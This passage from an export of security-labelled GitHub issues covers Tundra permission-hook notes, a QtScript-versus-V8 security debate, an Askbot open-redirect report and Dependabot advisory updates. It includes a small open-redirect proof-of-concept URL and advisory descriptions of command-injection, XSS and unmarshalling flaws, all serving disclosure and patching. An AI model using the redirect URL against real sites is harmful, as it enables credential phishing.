  - AboutToCreateEntity(UserConnection *source, MsgCreateEntity &entity)
  - AboutToRemoveEntity(UserConnection *source, MsgRemoveEntity &entity)
  - AboutToCreateComponent(UserConnection *source, Entity *target,
    luotava komponentti) (verkkoviestin lista hajotetaan yksittäisiksi
    viesteiksi)
  - AboutToRemoveComponent(UserConnection *source, Entity *target,
    poistettava komponentti)

Näihin ei olemassa 1:1 ValidateAction -entrypointtia:
    - AboutToCreateAttribute(UserConnection *source, IComponent *target)
dynaamiselle attribuutille
    - AboutToRemoveAttribute(UserConnection *source, IComponent *target)
dynaamiselle attribuutille
    - AboutToModifyAttribute(UserConnection *source, IAttribute
*targetWithOldValue, QVariant newValue)
    - optimointina/yksinkertaistuksena ettei tarvi hookata kaikkiin y.o.
signaaleihin (?): AboutToModifyEntity
       - Kutsutaan Create/RemoveComponent ja
Create/Modify/RemoveAttribute -tilanteissa

```
- AboutToTriggerAction(UserConnection *source, Entity *target,
```

ExecType, QString action, QStringList params)

Vain yksittäisten muutosten tarkistus (vs. batchattu) ei voi tukea
seuraavaa ominaisuutta:

attribute A true/false
attribute B true/false

Permissiot haluavat rajoittaa ehdon, että aina A==B.
A=0,B=0 aluksi.
Muutosyritys A<-1 ja B<-1 ei onnistu, koska sitä ei tehdä atomisesti.

myöhemmin lisättävät permissiot:
- AboutToCreateScene
- AboutToRemoveScene
- AboutToJoinScene
- AboutToLeaveScene
",no,"Feature Request,Security,"
realXtend/tundra,2911888,"Don't depend on current working directory being set suitably on Mac.","Remove the workaround in this commit https://github.com/realXtend/naali/commit/0b4a59cc0fd677d1c9a2e5f7f1fc932eef7cd415 so that Tundra does not change the cwd, or rely on the cwd to be in a certain directory. 

If there is a low-level OS operation which requires a certain cwd to be set, it should be set for the duration of the operation, and restored afterwards.

This is e.g. due to that Tundra can run hosted inside another process (e.g. a browser), which might not expect the cwd to be changed underneath it.
","Seems like exactly what we have for ogre too https://github.com/realXtend/naali/blob/tundra2/src/Core/OgreRenderingModule/OgreRenderingModule.cpp#L106

Cvetan try to find out where it is needed and try the above to temp set it.
",no,"OS X,Security,Bug,Ogre,Qt,"
realXtend/tundra,7241627,"Replace QtScript with V8 for Javascript execution.","qtScript is old, unsupported, and potentially insecure. It is also fairly slow compared to modern implementations. It would be wise to consider shifting to V8 for JS execution, which would be faster and allow for sandboxed execution.
","Also, this is related to #452 and #368.
there is perhaps a bit of confusion here: qtscript is not a js engine, but a thing that uses a js engine. it can use V8 too, we haven't tested but it seemed fairly good last i looked (ages go), in a branch of qtscript.

anyhow using V8 directly is of course possible, similar to how e.g. Syntensity did it, and might be a way for us to cleanly implement clever optimizations (perhaps using array types, which has given great results on the py side with numpy and such).

feel free to make a V8Module for Tundra in a branch so we can see :) I tested with Lua once, was quite easy and nice.
QtScript uses JavaScriptCore, Webkit's JS engine. In Qt 5 QtScript is in bugfixes-only deprecated mode and
the new scripting engine uses V8. The new JS api needs investigating it can only happen after
we sort out the rest of our Qt 5 story.
th3flyboy: It is _extremely_ important to back up these kind of comments ""old, unsupported, potentially insecure, fairly slow"", etc.. with details and proof. Otherwise, the comments will appear as opinions due to disfavorism, and easily look like FUD.

That being said, I generally agree with your points, and we are aware of the current and upcoming status of QtScript in Qt5. Here's the backing to these opinions:
- QtScript is slow. We've known this for a long time, in issue #313.
- QtScript is buggy. Only #484 is reported, but while writing QtBindingsGenerator to provide math bindings for Tundra, I encountered a mindboggingly large amount of issues, for which there are several workarounds in the generated bindings code (related to function overload resolution, type identification/prototype structure, toString() implementation, and mismatching/crashing the QtScript/JavaScriptCore register file)
- There is no maintained and developed version of QtScript for V8, neither for Qt 4 or Qt 5. https://bugreports.qt-project.org/browse/QTBUG-12503
- There was a project to rewrite QtScript to utilize V8 engine for Qt 5, but that project was abandoned. http://qt-project.org/wiki/V8_Port
- QtScript is legacy and undeveloped in Qt 5. https://bugreports.qt-project.org/browse/QTBUG-16478 I trust Kent Hansen's word on this more than Thiago Macieira's. They say that the old QtScript API will be maintained in Qt5, but we're more than disappointed, and our strategy is not to back any future script execution needs on this ""promise"".
- Also from previous link, there is a V8-based script engine in Qt 5, but it has been developed primarily for QtDeclarative (QML) purposes, which is a dead-in-the-water project as far as Tundra is concerned.

As for security, I've found no reason to say that QtScript is inherently unsecure. We do have several bugs about security+QtScript, but most of them are caused by our use of QtScriptGenerator (http://code.google.com/p/qtscriptgenerator/), which is a project for which security is out of scope. However, given the amount of crash bugs we have in place _today_, we don't currently have a secure working script execution environment in place.

If someone can integrate a replacing script engine as a Tundra plugin, we'll be happy to take a look.
Fair enough on all points. The main reason I bring up being unsecure is my
knowledge of what happens to projects when they go unmaintained security
wise. Someone will find a way to break it, and then all hell breaks loose
because no one is fixing it. This is generally why you don't want to rely
on projects that are unmaintianed or barely maintained for security, it's a
never ending arms race, and someone will find a way to break it, and if
it's not going to be supported, then it's going to be a massive target
surface waiting to be hit.

Also, I was not aware it was just in depreciated mode and not flat out
unsupported. My understanding was it was flat out unsupported and thus not
being patched anymore. Bad intel on my part. And yes, I should have backed
it up more, I didn't think to reference other bugs in the tracker when I
did that.

As for implementing a scripting API, Lua is first on my list if/when I get
around to scripting. I'll look at V8 after that.
We'll your still throwing opinions/guesses to be honest :) ""it will get unsecure now that it does not get commits anymore"". We don't know that, I guess you can assume that if you want. We are in total control what gets exposed to our js code at the end of the day, we can remove Qt modules, classes, functions, properties from whatever, including out own QObjects. We blacklisted obviously terrible things to expose at some point and no one has really worked to sort out a complete list. I'm not even sure if that can be proven out right when its secure.

Crash bugs are another thing versus insecure calls that can remove C:\windows\x.dll from scripting. Crash bugs they have lots of and if you encounter one you'll just have to work around in in your js if possible.

Real script security in Tundra imo comes from who can make entities with script components to the scene, and define the script, and from what storage scripts are going to be executed. If this is done well then its the responsibility of those trusted people who can add the script to make it secure and not crash the client. We already have such system in Tundra which can achieve this kind of control.

@antont and @juj Has probably looked most at the V8 and other script implementation. Afaik Toni said the V8 would not even bring much more speed to the actual execution. And as it has been noted multiple times the slow part is getting complex objects from C++ to JS and back.

I would welcome some noticeably faster script language in addition to JS. You could then use this scripting to do more performance critical parts of your code, perhaps talk to it via the scene or entity actions. I could see this being a good choise. For our company having prolly 10-15k lines of Tundra javascript apps out in the world, I would very much like to avoid porting them to another implementation of JS or even some other language. JS is fine for most things, but when you get to the heavy lifting it would be nice to get a proper quick thing, that maybe would not even need UI etc. but just the basic API/scene access. This basic exposing we could maybe even handle by hand, if the language would not have proper qt bindings of custom QObject outside the actual Qt modules. Exposing the full Qt + our own OQbjects etc. would of course be madness :)

**TL;DR; I think the current JS is secure enough when you combine logic that decides who can add scripts to the scene. Another faster language eg. Lua, would be a nice addition for coding your performance critical parts where the current JS has problems coping with.**
Personally, I'm more concerned about someone trying to smash the stack through JS or someone putting a backdoor in a 3rd party JS module, but for the most part, I understand the points you are making. The main concern I have about security isn't someone trying to mess with the scene, it's someone trying to gain a shell on a target system.
Yeah, crash bugs can exploited in various ways to yield control over code execution. Stack smashing is one, there
are many other types. Basically any time an attacker supplied data makes it to C++ and causes it to
crash, there's a very high risk of a remote code execution vulnerability. Even NULL deref bugs.
Jonne - using V8 directly and making the binding cleverly ourselves might well improve speed a lot, if we can do better in the c++ <-> js border than what currently happens with qtscript. I've just meant that because the bottleneck usually is in that interface, and not inside the js engine for js code, switching from JavaScriptCore to V8 while still using the qtscript mechanisms wouldn't probably change much.

About Lua, I tested a little with QtLua -- idea was also to check if that deals with the interfacing more efficiently, but I didn't get that far then (one evening). It is somewhat interesting as would give much of the Tundra APIs automatically (slots, properties, signals of QObjects such as Scene, Entity and IComponent) to Lua too, with the qt class metadata mechanisms. 
Qt 5's QJS seems to expose access to V8 API directly: https://qt.gitorious.org/qt/qtdeclarative/commit/6318f91dc0bf1ac428037c963b80b7a5d4e1ad30/diffs
",no,"Feature Request,QtScript,Usability,Security,Bug,Performance,Regression/Bitrot,Qt,"
ASKBOT/askbot-devel,42510002,"Unvalidated redirect","On the login page in URL we can see the parameter `next` which has default value `/`.
But if I send you the following link: `askbot/account/signin/?next=//google.ro` and you log in you will be redirected to google.ro

This vulnerability is called `Unvalidated redirect` and it can be used to send the users to a fake page, which can look exactly like `askbot/account/signin/` in order to steal the password. More information here: https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet

If you consider this issue important, we'll try to send a pull request quickly.

Yours respectfully,
Alex
",,no,"security,"
jrmehle/songkickr,777267737,"[Security] Update rake requirement from ~> 10.3.0 to ~> 13.0.3","[//]: # (dependabot-start)
⚠️  **Dependabot Preview has been deactivated** ⚠️

This pull request was created by Dependabot Preview, and you've upgraded to Dependabot. This means it won't respond to `dependabot` commands nor will it be automatically closed if a new version is found.

If you close this pull request, Dependabot will re-create it the next time it checks for updates and everything will work as expected.

---

[//]: # (dependabot-end)
Updates the requirements on [rake](https://github.com/ruby/rake) to permit the latest version.
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rake/CVE-2020-8130.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>OS Command Injection in Rake</strong>
There is an OS command injection vulnerability in Ruby Rake &lt; 12.3.3 in
Rake::FileList when supplying a filename that begins with the pipe character
<code>|</code>.</p>
<p>Patched versions: &gt;= 12.3.3
Unaffected versions: none</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-jppv-gw3r-w3q8"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects rake</strong>
There is an OS command injection vulnerability in Ruby Rake before 12.3.3 in Rake::FileList when supplying a filename that begins with the pipe character <code>|</code>.</p>
<p>Affected versions: &lt;= 12.3.2</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/ruby/rake/blob/master/History.rdoc"">rake's changelog</a>.</em></p>
<blockquote>
<p>=== 13.0.3</p>
<ul>
<li>Fix breaking change of execution order on TestTask.
Pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/368"">#368</a> by ysakasin</li>
</ul>
<p>=== 13.0.2</p>
<p>==== Enhancements</p>
<ul>
<li>Fix tests to work with current FileUtils
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/358"">#358</a> by jeremyevans</li>
<li>Simplify default rake test loader
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/357"">#357</a> by deivid-rodriguez</li>
<li>Update rdoc
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/366"">#366</a> by bahasalien</li>
<li>Update broken links to rake articles from Avdi in README
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/360"">#360</a> by svl7</li>
</ul>
<p>=== 13.0.1</p>
<p>==== Bug fixes</p>
<ul>
<li>Fixed bug: Reenabled task raises previous exception on second invokation
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/271"">#271</a> by thorsteneckel</li>
<li>Fix an incorrectly resolved arg pattern
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/327"">#327</a> by mjbellantoni</li>
</ul>
<p>=== 13.0.0</p>
<p>==== Enhancements</p>
<ul>
<li>Follows recent changes on keyword arguments in ruby 2.7.
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/326"">#326</a> by nobu</li>
<li>Make <code>PackageTask</code> be able to omit parent directory while packing files
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/310"">#310</a> by tonytonyjan</li>
<li>Add order only dependency
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/269"">#269</a> by take-cheeze</li>
</ul>
<p>==== Compatibility changes</p>
<ul>
<li>Drop old ruby versions(&lt; 2.2)</li>
</ul>
<p>=== 12.3.3</p>
<p>==== Bug fixes</p>
<ul>
<li>Use the application's name in error message if a task is not found.
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/303"">#303</a> by tmatilai</li>
</ul>
<p>==== Enhancements:</p>
<!-- raw HTML omitted -->
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/ruby/rake/commit/c2eeae2fe2b67170472a1441ebf84d3a238c3361""><code>c2eeae2</code></a> Bump version to 13.0.3</li>
<li><a href=""https://github.com/ruby/rake/commit/b6bf56c03249c215f844a6961b2ee9c98b6ffc2a""><code>b6bf56c</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/368"">#368</a> from ysakasin/fix_test_execution_order</li>
<li><a href=""https://github.com/ruby/rake/commit/37635e61ad2b663542216105ba23042f1e80683c""><code>37635e6</code></a> Fix breaking change of execution order on TestTask</li>
<li><a href=""https://github.com/ruby/rake/commit/65be0c78c84510be26e4c6abc1a3d12301f583aa""><code>65be0c7</code></a> Bump version to 13.0.2</li>
<li><a href=""https://github.com/ruby/rake/commit/6b8c70d2b39ac7c952f446d82fcf5e2fe6a09e09""><code>6b8c70d</code></a> History for rake-13.0.2</li>
<li><a href=""https://github.com/ruby/rake/commit/a7ecd32411a4e1d7dade44ed03462fce9c05015d""><code>a7ecd32</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/366"">#366</a> from bahasalien/patch-1</li>
<li><a href=""https://github.com/ruby/rake/commit/efae4f88963229a7c8ee54c3d13af5730993308b""><code>efae4f8</code></a> Fix doubled &quot;http://&quot; in line 102</li>
<li><a href=""https://github.com/ruby/rake/commit/49820401e29089fddb95f0499769a40c433b94ca""><code>4982040</code></a> Update rdoc; HTTP -&gt; HTTPS</li>
<li><a href=""https://github.com/ruby/rake/commit/5947d205b583045b2832a56e7e98a9a7a34393e3""><code>5947d20</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/357"">#357</a> from deivid-rodriguez/simplify_rake_test_loader</li>
<li><a href=""https://github.com/ruby/rake/commit/7fc761ceacf7a9a96ab5aac1dcec350bebe3bcdf""><code>7fc761c</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/360"">#360</a> from svl7/fix/update-article-links-avdi-series</li>
<li>Additional commits viewable in <a href=""https://github.com/ruby/rake/compare/v10.3.2...v13.0.3"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=rake&package-manager=bundler&previous-version=10.3.2&new-version=13.0.3)](https://dependabot.com/compatibility-score/?dependency-name=rake&package-manager=bundler&previous-version=10.3.2&new-version=13.0.3)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
jrmehle/songkickr,873632718,"[Security] Bump i18n from 0.6.11 to 1.8.10","[//]: # (dependabot-start)
⚠️  **Dependabot Preview has been deactivated** ⚠️

This pull request was created by Dependabot Preview, and you've upgraded to Dependabot. This means it won't respond to `dependabot` commands nor will it be automatically closed if a new version is found.

If you close this pull request, Dependabot will re-create it the next time it checks for updates and everything will work as expected.

---

[//]: # (dependabot-end)
Bumps [i18n](https://github.com/ruby-i18n/i18n) from 0.6.11 to 1.8.10. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/i18n/CVE-2014-10077.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>i18n Gem for Ruby lib/i18n/core_ext/hash.rb Hash#slice() Function Hash Handling DoS</strong>
i18n Gem for Ruby contains a flaw in the Hash#slice() function in
lib/i18n/core_ext/hash.rb that is triggered when calling a hash when
:some_key is in keep_keys but not in the hash. This may allow an attacker
to cause the program to crash.</p>
<p>Patched versions: &gt;= 0.8.0
Unaffected versions: none</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/ruby-i18n/i18n/releases"">i18n's releases</a>.</em></p>
<blockquote>
<h2>1.8.10</h2>
<ul>
<li>Fix string locale will trigger on_fallback hook - <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/562"">#562</a></li>
</ul>
<h2>1.8.9</h2>
<ul>
<li>Rely on Ruby 3's native <code>Hash#except</code> method -- <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/557"">#557</a></li>
</ul>
<p>This release also contains several build related updates -- rather than listing them out here, you can see the <a href=""https://github.com/ruby-i18n/i18n/compare/v1.8.8...v1.8.9"">compare view between 1.8.8 and 1.8.9</a>.</p>
<h2>1.8.8</h2>
<ul>
<li>Fixed threadsafety issues in Simple backend: <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/554"">#554</a></li>
<li>Re-attempt to fix threadsafety of fallbacks: <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/548"">#548</a></li>
</ul>
<hr />
<ul>
<li>Use <code>OpenSSL::Digest</code> instead of usual <code>Digest</code> libraries: <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/549"">#549</a></li>
<li>Goodbye, post-install message <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/552"">#552</a></li>
<li>Use Rails' main branch, instead of master <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/553"">#553</a></li>
</ul>
<h2>1.8.7</h2>
<ul>
<li>Fixed a regression with fallback logic: see issues <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/547"">#547</a>, <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/546"">#546</a> and <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/542"">#542</a>.</li>
</ul>
<h2>1.8.6</h2>
<ul>
<li>Fallbacks are now stored in <code>Thread.current</code> for multi-threading compatibility: <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/542"">#542</a></li>
<li>no-op arguments are no longer allowed for <code>I18n.t</code> calls -- fixes an incompatibility with Ruby 3.0: <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/545"">#545</a></li>
</ul>
<p>This gem's GitHub workflow files have been updated to ensure compatibility between new Rails versions (6.1) and the new Ruby release (3.0). See the &quot;Actions&quot; tab on GitHub for the full range of supported Rails and Ruby versions.</p>
<h2>v1.8.5</h2>
<ul>
<li>Fixed an issue where users could not use their own custom fallback classes - <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/536"">#536</a></li>
</ul>
<h2>v1.8.4</h2>
<ul>
<li>Fixed issue where fallbacks were not working when <code>I18n.fallbacks</code> was an array - <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/534"">#534</a></li>
<li>Fixed conditional around deprecating constant of <code>INTERPOLATION_PATTERN</code> - <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/531"">#531</a></li>
</ul>
<h2>v1.8.3</h2>
<p>Compare view: <a href=""https://github.com/ruby-i18n/i18n/compare/v1.8.2...v1.8.3"">https://github.com/ruby-i18n/i18n/compare/v1.8.2...v1.8.3</a></p>
<h2>Features / Improvements</h2>
<ul>
<li>Memory and speed improvements - <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/527"">#527</a>+ <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/528"">#528</a></li>
<li>Add option to disable fallbacks for I18n.exists? check - <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/482"">#482</a></li>
<li>Add an <code>on_fallback</code> hook to allow users to be notified when a fallback happens - <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/520"">#520</a></li>
</ul>
<h2>Bug Fixes</h2>
<ul>
<li>Fix an issue with deep_merge and chain fallback backends - <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/499"">#499</a> &amp; <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/509"">#509</a></li>
<li>Fix an issue with Rails ordinal number proc and keyword splatting - <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/521"">#521</a></li>
<li>Pass options as keyword arguments to translation procs - <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/529"">#529</a></li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/ruby-i18n/i18n/commit/0888807ab2fe4f4c8a4b780f5654a8175df61feb""><code>0888807</code></a> Bump to 1.8.10</li>
<li><a href=""https://github.com/ruby-i18n/i18n/commit/a4695615dedb3257dbcd20928ecf402019b69252""><code>a469561</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/562"">#562</a> from piecehealth/fix_on_fallback</li>
<li><a href=""https://github.com/ruby-i18n/i18n/commit/ff6e0b4d5f4d2576b554b8b8e43d82f61e7f04bb""><code>ff6e0b4</code></a> Fix string locale will trigger on_fallback hook.</li>
<li><a href=""https://github.com/ruby-i18n/i18n/commit/aec9d66dfdc1d06d43fa98bce3eb494699d3a7bb""><code>aec9d66</code></a> Bump to 1.8.9</li>
<li><a href=""https://github.com/ruby-i18n/i18n/commit/aae36c2f3e6129720483a176000bf1da9f6c0ffa""><code>aae36c2</code></a> Only attempt to set fallbacks= in tests if method is defined</li>
<li><a href=""https://github.com/ruby-i18n/i18n/commit/3951eee7b7a51e89b6beda12088c94b5bd8dd82b""><code>3951eee</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/557"">#557</a> from ruby-i18n/ca-except-ruby3</li>
<li><a href=""https://github.com/ruby-i18n/i18n/commit/7a262de0e6b42e7967f1b580f70812f395e2bc28""><code>7a262de</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/558"">#558</a> from ruby-i18n/ca-build</li>
<li><a href=""https://github.com/ruby-i18n/i18n/commit/7a885fd958340e855fef26bf9f5905f0f3e865ea""><code>7a885fd</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby-i18n/i18n/issues/550"">#550</a> from taki/update-require</li>
<li><a href=""https://github.com/ruby-i18n/i18n/commit/cead3e5143732a303f5eb947ecd8d0f101e46a78""><code>cead3e5</code></a> Prevent overwriting <code>Hash#except</code> method present in Ruby 3+</li>
<li><a href=""https://github.com/ruby-i18n/i18n/commit/bb7b689212a01baec405cc5f027ac4fc6b16fa71""><code>bb7b689</code></a> Exclude Ruby 3+ with all Rails 5.x versions</li>
<li>Additional commits viewable in <a href=""https://github.com/ruby-i18n/i18n/compare/v0.6.11...v1.8.10"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=i18n&package-manager=bundler&previous-version=0.6.11&new-version=1.8.10)](https://dependabot.com/compatibility-score/?dependency-name=i18n&package-manager=bundler&previous-version=0.6.11&new-version=1.8.10)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
jrmehle/songkickr,908163490,"[Security] Bump activesupport from 4.1.6 to 6.1.3.2","[//]: # (dependabot-start)
⚠️  **Dependabot Preview has been deactivated** ⚠️

This pull request was created by Dependabot Preview, and you've upgraded to Dependabot. This means it won't respond to `dependabot` commands nor will it be automatically closed if a new version is found.

If you close this pull request, Dependabot will re-create it the next time it checks for updates and everything will work as expected.

---

[//]: # (dependabot-end)
Bumps [activesupport](https://github.com/rails/rails) from 4.1.6 to 6.1.3.2. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activesupport/CVE-2015-3227.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Possible Denial of Service attack in Active Support</strong>
Specially crafted XML documents can cause applications to raise a
<code>SystemStackError</code> and potentially cause a denial of service attack.  This
only impacts applications using REXML or JDOM as their XML processor.  Other
XML processors that Rails supports are not impacted.</p>
<p>All users running an affected release should either upgrade or use one of the work arounds immediately.</p>
<h2>Workarounds</h2>
<p>Use an XML parser that is not impacted by this problem, such as Nokogiri or
LibXML.  You can change the processor like this:</p>
<p>ActiveSupport::XmlMini.backend = 'Nokogiri'</p>
<p>If you cannot change XML parsers, then adjust
<code>RUBY_THREAD_MACHINE_STACK_SIZE</code>.</p>
<p>Patched versions: &gt;= 4.2.2; ~&gt; 4.1.11; ~&gt; 3.2.22
Unaffected versions: none</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activesupport/CVE-2015-3226.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>XSS Vulnerability in ActiveSupport::JSON.encode</strong>
When a <code>Hash</code> containing user-controlled data is encode as JSON (either through
<code>Hash#to_json</code> or <code>ActiveSupport::JSON.encode</code>), Rails does not perform adequate
escaping that matches the guarantee implied by the <code>escape_html_entities_in_json</code>
option (which is enabled by default). If this resulting JSON string is subsequently
inserted directly into an HTML page, the page will be vulnerable to XSS attacks.</p>
<p>For example, the following code snippet is vulnerable to this attack:</p>
<p>Similarly, the following is also vulnerable:</p>
<p>All applications that renders JSON-encoded strings that contains user-controlled
data in their views should either upgrade to one of the FIXED versions or use
the suggested workaround immediately.</p>
<h2>Workarounds</h2>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Patched versions: &gt;= 4.2.2; ~&gt; 4.1.11
Unaffected versions: &lt; 4.1.0</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activesupport/CVE-2020-8165.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStore</strong>
There is potentially unexpected behaviour in the MemCacheStore and RedisCacheStore where, when
untrusted user input is written to the cache store using the <code>raw: true</code> parameter, re-reading the result
from the cache can evaluate the user input as a Marshalled object instead of plain text. Vulnerable code looks like:</p>
<pre><code>data = cache.fetch(&quot;demo&quot;, raw: true) { untrusted_string }
</code></pre>
<p>Versions Affected:  rails &lt; 5.2.5, rails &lt; 6.0.4
Not affected:       Applications not using MemCacheStore or RedisCacheStore. Applications that do not use the <code>raw</code> option when storing untrusted user input.
Fixed Versions:     rails &gt;= 5.2.4.3, rails &gt;= 6.0.3.1</p>
<h2>Impact</h2>
<p>Unmarshalling of untrusted user input can have impact up to and including RCE. At a minimum,
this vulnerability allows an attacker to inject untrusted Ruby objects into a web application.</p>
<p>In addition to upgrading to the latest versions of Rails, developers should ensure that whenever
they are calling <code>Rails.cache.fetch</code> they are using consistent values of the <code>raw</code> parameter for both</p>
<!-- raw HTML omitted -->
</blockquote>
